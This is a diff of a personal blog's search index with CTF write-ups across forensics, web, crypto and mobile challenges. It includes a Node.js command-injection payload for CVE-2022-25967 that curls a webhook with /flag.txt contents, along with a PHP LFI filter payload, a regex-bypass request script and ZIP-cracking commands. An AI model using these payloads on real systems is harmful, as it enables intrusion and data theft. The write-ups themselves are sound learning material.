+<li>File -&gt; Export -&gt; Http, and save all the files.</li>
+<li>we can see there is 5 files exported, 2 text file with word <code>File received successfully!</code> and <code>file_data=16ae9187d13259788a97aef16a7d50f8b6376fbcba92a0f53e7e68d9f562a3a6576a3183a8dc8631c64fbd9147c8b608</code><ul>
+<li>usefull for later</li>
+</ul>
+</li>
+<li>And there is a file with big data 24,345kb and let us see what file is that.</li>
+</ol>
+<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/395b8f53-8888-4af0-bf28-ae6f5b156992"
+                      alt="image"
+                ></li>
+</ul>
+<ol start="7">
+<li>Looks like it is a elf file<br>  <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/a9223eb5-5494-4476-b76e-94ca61886bab"
+                      alt="image"
+                ></li>
+<li>I manage to find a website to extract the elf file <a class="link"   href="https://www.ezyzip.com/open-extract-elf-file.html#" >EzyZIP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li>We can see the largest file is here after extract</li>
+</ol>
+<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/d61f4dc0-bd2e-4e85-922c-cbaaa903fb5e"
+                      alt="image"
+                ><br>After have a long time searching, i cant found any ways to extract pydata… skill issue XD</li>
+</ul>
+<ol start="10">
+<li>After the end of the day, my friend told me there is something call <code>Pyinstxtractor</code> that can extract it.<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/647ba1e4-5257-4eae-8e27-94885a3b018b"
+                      alt="image"
+                ></li>
+<li>This is what i found</li>
+</ul>
+</li>
+<li>okayyyy here is it<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/839516f6-2d26-4c28-af8e-cfbd172314e6"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Theres alot files inside, but the one the name <code>skyfall-lewis-edited-version.pyc</code> is the most suspicious.<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/b3e6721f-12fd-4eba-a1fc-7d8d92ac3bc0"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>With the use of this website <a class="link"   href="https://pylingual.io/" >Pylingual<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, i transfer pyc files to py<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/575f7882-fe26-4d1c-91f5-69de17c6099c"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>We can see it is a AES encyption function and the key is the time which the user encrypt when downloaded, so lets go back to wireshark and find the date when she successfuly download.<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/f286e913-9441-4f6b-8273-1b7df152b17d"
+                      alt="image"
+                ></li>
+<li>We can find out that the epoch for the time she download the file is <code>1733988750</code></li>
+</ul>
+</li>
+<li>Then use GPT xd find the key out<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/c5d87093-080a-410e-b361-ce07d7c64747"
+                      alt="image"
+                ></li>
+<li>ps: I also dk why need to use <code>1733988749</code> just told by my friend to use it cant find any things that support this epoch XD.</li>
+</ul>
+</li>
+<li>Okay, then let us go to decrypt it. Use cyberchef</li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/0a6837ae-ddf5-41d3-a810-7318c56a4607"
+                      alt="image"
+                ><br>Heres the flag.<br>Okay its maybe abit harder than i though. cry die.</li>
+</ol>
+<h4 id="Acknowledgement-1"><a href="#Acknowledgement-1" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx to Bakayang for providing solution at the end of the day</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Useless-Website"><a href="#Useless-Website" class="headerlink" title="Useless Website"></a>Useless Website</h2><hr>
+<ol>
+<li><p>Download the source code of the website</p>
+</li>
+<li><p>We can see theres something in the package.json file</p>
+<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/ded38f60-d45c-406f-87ca-353241b395e5"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li><p>Searching on the internet <code>CVE-2022-25967</code> showing that there is some leakage can be use on the eta framework.</p>
+</li>
+<li><p>In burpsuite, intercept the web and change to this</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>/utils/settings HTTP/1.1</span></figcaption><table><tr><td class="code"><pre><span class="line">Host: 5.75.155.50:1341</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-None-Match: W/&quot;1057-ih1IUXlwncna8aHynJLYIHjiX30&quot;</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Length: 292</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;view options&quot;: &#123;</span><br><span class="line">      &quot;varName&quot;: &quot;x=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl https://webhook.site/self id/$(cat /flag.txt)&#x27;)&quot;,</span><br><span class="line">      &quot;include&quot;: false,</span><br><span class="line">      &quot;includeFile&quot;: false,</span><br><span class="line">      &quot;useWith&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>And we can find out the flag at the end of the webhook link.</p>
+<ul>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://github.com/user-attachments/assets/ee3ce174-09de-43c1-82ea-43f979aa075d"
+                      alt="image"
+                ></li>
+<li><code>CSLU&#123;wh4ts_y0ur_et4?&#125;</code></li>
+</ul>
+</li>
+</ol>
+<h4 id="Acknowledgement-2"><a href="#Acknowledgement-2" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h4><p>Thx for Megat for the solution.</p>
+]]></content>
+      <categories>
+        <category>CTF 2024</category>
+      </categories>
+      <tags>
+        <tag>Forensics</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>EQFCTF 2025</title>
+    <url>/2025/01/18/EQFCTF-2025/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Join-Our-Discord"><a href="#Join-Our-Discord" class="headerlink" title="Join Our Discord"></a>Join Our Discord</h2><ul>
+<li>Just join the discord and there is the flag on the annoucment channel <code>RVFDVEZ7VzNsQzBtM19UMF9FcXVpbGlicml1bV9EMXNjMHJkfQ==</code><br>cyberchef it and get the flag <code>EQCTF&#123;W3lC0m3_T0_Equilibrium_D1sc0rd&#125;</code></li>
+</ul>
+<h1 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h1><h2 id="Velociraptor"><a href="#Velociraptor" class="headerlink" title="Velociraptor"></a>Velociraptor</h2><ol>
+<li>Download the attach file</li>
+<li>VeLoCiraptor\C\Users\kelvin\AppData\Roaming\Microsoft\Windows\Recent<ul>
+<li>We can found some hash on this page with the file name <code>RVFDVEZ7MXRzX3IzNExseV9o and MG1ldzBya190UnVTdF9tMyF9</code><br> <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/image.png"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Then just cyberchef it.</li>
+</ol>
+<h2 id="Kuih-Lapis"><a href="#Kuih-Lapis" class="headerlink" title="Kuih Lapis"></a>Kuih Lapis</h2><ol>
+<li>Download the poem.pdf file</li>
+<li>Throw it into <a class="link"   href="https://pdfcrowd.com/inspect-pdf/" >pdf inspect<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> website and we will see all the details in this page<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/image11.png"
+                      alt="image"
+                ></li>
+<li>And we can see the details and flag at here <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/image222.png"
+                      alt="image"
+                ></li>
+</ol>
+<h2 id="Lost-Password"><a href="#Lost-Password" class="headerlink" title="Lost Password"></a>Lost Password</h2><ol>
+<li>Download the zip file.</li>
+<li>We can see inside have cloud_password.txt and a index.html file. <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/imagebk1.png"
+                      alt="image"
+                ></li>
+<li>With the use of BKCrack, we can use known plaintext attack on pkzip</li>
+<li>Next find the common bytes in the index.html file(why html file? as we dont know the starters of the cloud_password.txt) <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/imagebk2.png"
+                      alt="image"
+                >.</li>
+<li>Save those code in a file call bin </li>
+<li>Then <code>bkcrack -C html.zip -c &quot;index.html&quot; -p bin</code></li>
+<li>After getting the key, Continue to crack it</li>
+<li><code>bkcrack -C html.zip -k 1d63e85a b3b66126 33619315 -U bkbk.zip 1234</code></li>
+</ol>
+<p>1d63e85a b3b66126 33619315 is the key, and 1234 is the password we set.<br>9. then unzip the zip file bkbk.zip with pass 1234.<br>10. Thats it the flag here<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/imagelah.png"
+                      alt="flag"
+                ></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Neighbour-RSA"><a href="#Neighbour-RSA" class="headerlink" title="Neighbour RSA"></a>Neighbour RSA</h2><ol>
+<li>Download the file, then see the rsa encrypted code<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import inverse, long_to_bytes</span><br><span class="line">from gmpy2 import isqrt, mpz</span><br><span class="line">def fermat_factorization(N):</span><br><span class="line">    a = isqrt(N) + 1</span><br><span class="line">    b2 = a * a - N</span><br><span class="line">    while not is_square(b2):</span><br><span class="line">        a += 1</span><br><span class="line">        b2 = a * a - N</span><br><span class="line">    b = isqrt(b2)</span><br><span class="line">    return a - b, a + b</span><br><span class="line"></span><br><span class="line">def is_square(n):</span><br><span class="line">    return isqrt(n) ** 2 == n</span><br><span class="line"></span><br><span class="line"># Given values</span><br><span class="line">N = 14587704432822344892341272427282646120364434437414523883376089608218979364959927948590898540264210246449374363014541914863792835772986609660515612532877044074684115597786182642011407163350289201826895454398548254854919237599957739718174053771619150887665707867636064460914489445835497948439951659044458159773886454887057327846897569977945202458245268351728125973721764332352011029125694046428350269451464778793326007087955043888570293765138721335344787054343738337660927131968049415376352589981259058448540690666004751490375493430556965591293772542601776934892741235532054785639594081598607404023545471998403197674267</span><br><span class="line">e = 65537</span><br><span class="line">C = 7329184746351979600304810893726842767688467204256990201181172159445966473650977905122553415838916142690364388789400790015517642902297387406215773278164829517035052625373870964570981590734714495297149889660019174034119566329569798047522829383224123884562703447321306836996392334132844673471179765556339187200820259655159008340673516040862000226792914228312336356120448967504158288031247387263438925257977725844911872753683719735641011693324441777888582417108481882731436005780409094974241968759397096299213838515746566064813787517925040756180508206242396925444425306180593790729890681708626826056328684043890127100581</span><br><span class="line"></span><br><span class="line"># Step 1: Factorize N</span><br><span class="line">p, q = fermat_factorization(N)</span><br><span class="line">print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 2: Compute the private key d</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(f&quot;d = &#123;d&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 3: Decrypt the ciphertext C</span><br><span class="line">plaintext = pow(C, d, N)</span><br><span class="line">print(f&quot;Plaintext (as long): &#123;plaintext&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 4: Convert the plaintext to bytes</span><br><span class="line">flag = long_to_bytes(plaintext)</span><br><span class="line">print(f&quot;Flag: &#123;flag.decode()&#125;&quot;)</span><br></pre></td></tr></table></figure></div></li>
+<li>Then decrypt it! <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import inverse, long_to_bytes</span><br><span class="line">from gmpy2 import isqrt, mpz</span><br><span class="line">def fermat_factorization(N):</span><br><span class="line">a = isqrt(N) + 1</span><br><span class="line">b2 = a * a - N</span><br><span class="line">while not is_square(b2):</span><br><span class="line">    a += 1</span><br><span class="line">    b2 = a * a - N</span><br><span class="line">b = isqrt(b2)</span><br><span class="line">return a - b, a + b</span><br><span class="line"></span><br><span class="line">def is_square(n):</span><br><span class="line">return isqrt(n) ** 2 == n</span><br><span class="line"></span><br><span class="line"># Given values</span><br><span class="line">N = 14587704432822344892341272427282646120364434437414523883376089608218979364959927948590898540264210246449374363014541914863792835772986609660515612532877044074684115597786182642011407163350289201826895454398548254854919237599957739718174053771619150887665707867636064460914489445835497948439951659044458159773886454887057327846897569977945202458245268351728125973721764332352011029125694046428350269451464778793326007087955043888570293765138721335344787054343738337660927131968049415376352589981259058448540690666004751490375493430556965591293772542601776934892741235532054785639594081598607404023545471998403197674267</span><br><span class="line">e = 65537</span><br><span class="line">C = 7329184746351979600304810893726842767688467204256990201181172159445966473650977905122553415838916142690364388789400790015517642902297387406215773278164829517035052625373870964570981590734714495297149889660019174034119566329569798047522829383224123884562703447321306836996392334132844673471179765556339187200820259655159008340673516040862000226792914228312336356120448967504158288031247387263438925257977725844911872753683719735641011693324441777888582417108481882731436005780409094974241968759397096299213838515746566064813787517925040756180508206242396925444425306180593790729890681708626826056328684043890127100581</span><br><span class="line"></span><br><span class="line"># Step 1: Factorize N</span><br><span class="line">p, q = fermat_factorization(N)</span><br><span class="line">print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 2: Compute the private key d</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(f&quot;d = &#123;d&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 3: Decrypt the ciphertext C</span><br><span class="line">plaintext = pow(C, d, N)</span><br><span class="line">print(f&quot;Plaintext (as long): &#123;plaintext&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 4: Convert the plaintext to bytes</span><br><span class="line">flag = long_to_bytes(plaintext)</span><br><span class="line">print(f&quot;Flag: &#123;flag.decode()&#125;&quot;)&lt;/p&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>and here is it the flag</li>
+</ol>
+<h2 id="Neighbour-RSA-2"><a href="#Neighbour-RSA-2" class="headerlink" title="Neighbour RSA_2"></a>Neighbour RSA_2</h2><ol>
+<li>Here is the original code provided<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import prev_prime as next_prime</span><br><span class="line">import secrets</span><br><span class="line"></span><br><span class="line">flag = b&quot;EQCTF&#123;&lt;REDACTED&gt;&#125;&quot;</span><br><span class="line">a = bytes_to_long(secrets.token_bytes(100))</span><br><span class="line"></span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = next_prime(a+p)</span><br><span class="line"></span><br><span class="line">N = int(p*q)</span><br><span class="line">e = 65537</span><br><span class="line">f = int(q+a-p)</span><br><span class="line"></span><br><span class="line">C = pow(bytes_to_long(flag),e,N)</span><br><span class="line"></span><br><span class="line">print(f&quot;&#123;N=&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;e=&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;C=&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;f=&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># N=10986069679740899320769487987259965136338163538313920951921558170716399011131571749355967327929782757252961432250665732844670832757630969990974354211674665217879301194915967815961901955331119097862220567741900953344002421010199387139438258915388299120537312319419560196095221842536034797857570594271497968571543268632342368822758109031157038270115475046299925831141039892806064466450571546834222025788616070408548026473179492912530200671560292851465500255213172920644302815477881129226831758156389887396481079039150256181152083078507883863985140189407376955776873853730599843478872399976242973508423433618152961348309</span><br><span class="line"># e=65537</span><br><span class="line"># C=2195468989281538327484120144714886786222108443822386213335264431639447179575013802497596322014889540032797783666693430103844035492180467143334243466603968944829680836129211979667061913058333561267630828758422011805278536599370681276716534375047691415305153173304117404635308274845621779917651565487097467077938208235595083835638297185421167329868537607503750906624903899336968072524704962983010525959106240384416922803445710408493786560172567404469778095227805268385869729463091111594408973206573286013513443234182105724723290297083787222131780636442462497223002541517291130831271935451970740180808267897428166746499</span><br><span class="line"># f=4203301120017181153512192371191327436380286582036247438379481982220240276670686609670968370331071343886281566516951351186472802979725501149166852576293749655990806367361286991990410689444889766967820170478115967009340001288791419622177173652</span><br></pre></td></tr></table></figure></div></li>
+<li>Decrypt it<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes, inverse</span><br><span class="line">from gmpy2 import isqrt</span><br><span class="line"></span><br><span class="line"># Given values</span><br><span class="line">N = 10986069679740899320769487987259965136338163538313920951921558170716399011131571749355967327929782757252961432250665732844670832757630969990974354211674665217879301194915967815961901955331119097862220567741900953344002421010199387139438258915388299120537312319419560196095221842536034797857570594271497968571543268632342368822758109031157038270115475046299925831141039892806064466450571546834222025788616070408548026473179492912530200671560292851465500255213172920644302815477881129226831758156389887396481079039150256181152083078507883863985140189407376955776873853730599843478872399976242973508423433618152961348309</span><br><span class="line">e = 65537</span><br><span class="line">C = 2195468989281538327484120144714886786222108443822386213335264431639447179575013802497596322014889540032797783666693430103844035492180467143334243466603968944829680836129211979667061913058333561267630828758422011805278536599370681276716534375047691415305153173304117404635308274845621779917651565487097467077938208235595083835638297185421167329868537607503750906624903899336968072524704962983010525959106240384416922803445710408493786560172567404469778095227805268385869729463091111594408973206573286013513443234182105724723290297083787222131780636442462497223002541517291130831271935451970740180808267897428166746499</span><br><span class="line">f = 4203301120017181153512192371191327436380286582036247438379481982220240276670686609670968370331071343886281566516951351186472802979725501149166852576293749655990806367361286991990410689444889766967820170478115967009340001288791419622177173652</span><br><span class="line"></span><br><span class="line"># Approximate a</span><br><span class="line">a_approx = f // 2</span><br><span class="line"></span><br><span class="line"># Define a small range around a_approx</span><br><span class="line">range_size = 1000  # Adjust this range as needed</span><br><span class="line"></span><br><span class="line"># Iterate over the range</span><br><span class="line">for delta in range(-range_size, range_size + 1):</span><br><span class="line">    a = a_approx + delta</span><br><span class="line"></span><br><span class="line">    # Solve the quadratic equation: p^2 + (f - a) * p - N = 0</span><br><span class="line">    A = 1</span><br><span class="line">    B = f - a</span><br><span class="line">    C_eq = -N</span><br><span class="line"></span><br><span class="line">    # Discriminant</span><br><span class="line">    discriminant = B**2 - 4 * A * C_eq</span><br><span class="line"></span><br><span class="line">    # Check if discriminant is a perfect square</span><br><span class="line">    if discriminant &gt;= 0:</span><br><span class="line">        sqrt_discriminant = isqrt(discriminant)</span><br><span class="line">        if sqrt_discriminant * sqrt_discriminant == discriminant:</span><br><span class="line">            # Solve for p</span><br><span class="line">            p_candidate = (-B + sqrt_discriminant) // (2 * A)</span><br><span class="line"></span><br><span class="line">            # Check if p_candidate is a factor of N</span><br><span class="line">            if N % p_candidate == 0:</span><br><span class="line">                p = p_candidate</span><br><span class="line">                q = N // p</span><br><span class="line">                print(f&quot;Found p and q:&quot;)</span><br><span class="line">                print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">                print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line">                # Compute phi(N)</span><br><span class="line">                phi = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line">                # Compute the private key d</span><br><span class="line">                d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">                # Decrypt the ciphertext</span><br><span class="line">                plaintext = pow(C, d, N)</span><br><span class="line"></span><br><span class="line">                # Convert the plaintext to bytes</span><br><span class="line">                flag = long_to_bytes(plaintext)</span><br><span class="line">                print(f&quot;Flag: &#123;flag.decode()&#125;&quot;)</span><br><span class="line">                break</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br><span class="line">else:</span><br><span class="line">    print(&quot;Failed to factorize N.&quot;)</span><br></pre></td></tr></table></figure></div></li>
+<li>Anddd there you go the flag</li>
+</ol>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="EggSecret"><a href="#EggSecret" class="headerlink" title="EggSecret"></a>EggSecret</h2><ol>
+<li><p>First download the file attached and lets see whats inside.</p>
+</li>
+<li><p>We can see that there is a secret hash at there <code>00e39786989574093743872279278460</code> also there is something we need to bypass <code>(preg_match(&quot;/^(.*?)+$/s&quot;, $egg))</code></p>
+</li>
+<li><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://135.181.88.229:31730/&quot;</span><br><span class="line">params = &#123;&quot;eggSecret&quot;: &quot;240610708&quot;&#125;  # String with MD5 hash starting with &quot;0e&quot;</span><br><span class="line">data = &#123;&quot;egg&quot;: &quot;A&quot; * 10000&#125;  # Very large input to bypass the regex</span><br><span class="line">response = requests.post(url, params=params, data=data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>and we can get the flag content.</p>
+</li>
+</ol>
+<h2 id="KingsBrew"><a href="#KingsBrew" class="headerlink" title="KingsBrew"></a>KingsBrew</h2><ol>
+<li>First we get into the website using the host and port given.</li>
+<li>According to the hint it should be something menu as when you press {drink and flag!} it jump out menu.php.</li>
+<li>After we test, LFI is usable in this case</li>
+<li><code>http://135.181.88.229:35206/?page=php://filter/convert.base64-encode/resource=menu.php</code></li>
+<li>This is one of LFI payloads of PHP filters to read menu.php without executing PHP and decode the base 64 by ourself using cyberchef.</li>
+</ol>
+<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="Who’s-that-pukimon"><a href="#Who’s-that-pukimon" class="headerlink" title="Who’s that pukimon"></a>Who’s that pukimon</h2><ol>
+<li>Download the APK Andorid files and open it in a android emulator(Im using andorid studio)</li>
+<li>We can see that this is a game that we need to guess who is this Pokemon (pukimon)<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/22.png"
+                      alt="gueessss"
+                ></li>
+<li>With the use of jadx-gui</li>
+<li>We can see that the main activity files is mainactivity<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/11.png"
+                      alt="main"
+                ></li>
+<li>Find it out at (source&#x2F;io.eqctf.pukimon&#x2F;MainActivitykt) </li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/33.png"
+                      alt="hey"
+                ><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    /* JADX INFO: Access modifiers changed from: private */</span><br><span class="line">    public static final Unit a$lambda$11$lambda$10(Context yeet, MutableState a$delegate) &#123;</span><br><span class="line">        Intrinsics.checkNotNullParameter(yeet, &quot;$yeet&quot;);</span><br><span class="line">        Intrinsics.checkNotNullParameter(a$delegate, &quot;$a$delegate&quot;);</span><br><span class="line">        if (a(a$lambda$6(a$delegate))) &#123;</span><br><span class="line">            Toast.makeText(yeet, &quot;It&#x27;s &quot; + a$lambda$6(a$delegate), 0).show();</span><br><span class="line">            byte[] decode = Base64.decode(&quot;AEUAUQBDAFQARgB7ADEAVABzAF8AUwBoAHIAMABvAE0AcgAxAHMASABpAEUAIQAhACEAIQB9&quot;, 0);</span><br><span class="line">            Intrinsics.checkNotNullExpressionValue(decode, &quot;decode(...)&quot;);</span><br><span class="line">            Log.d(&quot;Flag&quot;, &quot;Congratz on guessing the pokemon: &quot;.concat(new String(decode, Charsets.UTF_8)));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Toast.makeText(yeet, &quot;It&#x27;s not &quot; + a$lambda$6(a$delegate), 0).show();</span><br><span class="line">        &#125;</span><br><span class="line">        return Unit.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
+<li>Decode <code>AEUAUQBDAFQARgB7ADEAVABzAF8AUwBoAHIAMABvAE0AcgAxAHMASABpAEUAIQAhACEAIQB9</code> with cyberchef and we can get the flag EQCTF{1Ts_Shr0oMr1sHiE!!!!}</li>
+</ol>
+<h2 id="Capture-that-Pukimon"><a href="#Capture-that-Pukimon" class="headerlink" title="Capture that Pukimon"></a>Capture that Pukimon</h2><ol>
+<li>With the use of http toolkit, we can intercept the data from the firebase<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/shrommie.png"
+                      alt="shrommie"
+                ></li>
+<li>And thats the flag EQCTF{Int3RcEpT_da_Tr3FfiC}”</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF 2025</category>
+      </categories>
+      <tags>
+        <tag>Forensics</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Try Hack Me Hackinfinity Battle CTF 2025</title>
+    <url>/2025/03/19/Try-Hack-Me-Hackinfinity-Battle-CTF-2025/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="NotePad-Online"><a href="#NotePad-Online" class="headerlink" title="NotePad Online"></a>NotePad Online</h2><ol>
+<li>First, start the machine and sign in to the ip address and email+password given.</li>
+<li>Have a look in the url, we can see the url have id&#x3D;1.</li>
+<li>Lets have a try to increase the number and we can found that it do can be increase and changing different data shown.</li>
+<li>After arrive id&#x3D;7, it show that we can decrease the number 1 so change it to 0</li>
+<li>Tada! The flag is there <code>THM&#123;i_can_see_your_notes&#125;</code></li>
+</ol>
+<h1 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h1><h2 id="Catch-Me-If-You-Can"><a href="#Catch-Me-If-You-Can" class="headerlink" title="Catch Me If You Can"></a>Catch Me If You Can</h2><ol>
+<li>According to the Image given, It show a building with a some arts.</li>
+<li>after image search on google, we found that it is at brazil, beco do batman.</li>
+<li>Google search beco do batman burger restaurant shows some restaurant name but first is coringa do beco.</li>
+<li>Flag &#x3D; THM{coringa_do_beco}</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
     <title>Readme</title>
     <url>/2024/12/31/Readme/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><p>This is my First Post in my Website!!<br>There will be Writeup for my CTF Challenge and maybe some Learning stuff I Guess???</p>
@@ -1463,47 +1481,9 @@
       </tags>
   </entry>
   <entry>
-    <title>Try Hack Me Hackinfinity Battle CTF 2025</title>
-    <url>/2025/03/19/Try-Hack-Me-Hackinfinity-Battle-CTF-2025/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="NotePad-Online"><a href="#NotePad-Online" class="headerlink" title="NotePad Online"></a>NotePad Online</h2><ol>
-<li>First, start the machine and sign in to the ip address and email+password given.</li>
-<li>Have a look in the url, we can see the url have id&#x3D;1.</li>
-<li>Lets have a try to increase the number and we can found that it do can be increase and changing different data shown.</li>
-<li>After arrive id&#x3D;7, it show that we can decrease the number 1 so change it to 0</li>
-<li>Tada! The flag is there <code>THM&#123;i_can_see_your_notes&#125;</code></li>
-</ol>
-<h1 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h1><h2 id="Catch-Me-If-You-Can"><a href="#Catch-Me-If-You-Can" class="headerlink" title="Catch Me If You Can"></a>Catch Me If You Can</h2><ol>
-<li>According to the Image given, It show a building with a some arts.</li>
-<li>after image search on google, we found that it is at brazil, beco do batman.</li>
-<li>Google search beco do batman burger restaurant shows some restaurant name but first is coringa do beco.</li>
-<li>Flag &#x3D; THM{coringa_do_beco}</li>
-</ol>
-]]></content>
-  </entry>
-  <entry>
     <title></title>
     <url>/404.html</url>
